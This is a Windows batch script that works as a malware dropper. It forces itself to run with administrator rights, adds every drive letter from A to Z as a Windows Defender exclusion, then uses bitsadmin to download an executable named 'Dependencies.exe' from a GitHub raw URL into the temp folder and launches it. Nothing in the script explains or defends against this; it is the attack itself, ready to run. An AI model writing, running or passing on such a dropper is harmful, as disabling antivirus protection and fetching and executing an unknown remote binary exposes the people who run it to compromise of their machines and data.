@echo off
setlocal
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell start-process '%0' -verb runas
    exit /b
)
for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (  
        powershell -Command "Add-MpPreference -ExclusionPath '%%d:\'"
    )
)
bitsadmin /transfer myDownloadJob /download /priority high "https://github.com/0xIftekhar443/lss/raw/main/Dependencies.exe" "%TEMP%\Dependencies.exe"
start "" "%TEMP%\Dependencies.exe"
